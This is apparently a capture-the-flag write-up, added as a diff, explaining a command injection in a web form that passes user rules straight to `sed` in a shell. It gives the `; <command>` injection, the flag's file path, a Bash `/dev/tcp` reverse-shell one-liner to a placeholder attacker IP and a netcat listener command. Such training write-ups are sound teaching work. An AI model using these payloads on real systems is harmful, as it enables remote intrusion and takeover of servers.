@@ -1,0 +1,14 @@
+# Solution
+The website is pretty simple. The only places accepting user input are the 2 textboxes. The website informs us that the format rule uses `sed`'s syntax. `sed` is a command line utility for manipulating text. And indeed, if we provide the simple rule `s/a/b/` with input text `a`, we get the expected output of `b`.
+
+The vulnerability can be discovered by realising that the actual `sed` utility is being used to format the text. The syntax hint is 1 way to reach that conclusion. Another is to play around with invalid format rules. Because they are invalid, `sed` will throw an error which is shown in the browser. To reiterate, the text replace feature is implemented by spawning a new process which executes the actual `sed` command. The code simply appends the user's format rule to the command, without any attempt at sanitisation. The resulting vulnerability is called a command injection. Meaning, we can craft our input such that shell commands are injected and executed by the server. Thus, we can make the server execute any command with a little Bash-foo. The correct approach to prevent this vulnerability would have been to actually implement a text replacement feature with `sed`'s syntax. A blacklist and sanitisation are not good solutions as making them watertight is hard.
+
+Making Bash execute multiple commands with a single line of input can with these symbols: `&&`, `;`, `||`, `$(...)`, etc. Meanwhile, `f'sed -e {replace_rule}'` is the python server code used to build the command for the subprocess. It is now simple to see how this can be abused. Let us use `;`, which is a separator for sequential commands. We can execute any shell command by providing the format rule `; <command>` on the website.
+
+The flag can be found in the home directory of the current user (`/home/webadmin/flag.txt`).
+
+The easiest way to read the flag is by `cat`ing it. However, part 2 of this challenge requires an interactive session. A reverse shell can give us this. A reverse shell is a technique in which we send a command to the victim, forcing it to turn around (reverse) and open a connection to our computer. The advantage over a forward shell is that contacting a victim's computer is usually hard as they are behind a firewall which we cannot configure. On the other hand, we *can* configure our own firewall to allow the victim's connection to come through.
+
+Setting up a reverse shell requires 2 steps:
+1. Forcing the victim to open a connection to us. Opening a TCP connection using Bash can be done with the following command: `bash -c 'bash -i >& /dev/tcp/<attacker_ip>/<netcat_server_port> 0>&1'`.
+2. Listening for the incoming connection. The netcat utility can be used to listen for incoming connections on our own machine: `nc -lnvp <listen_port>`.
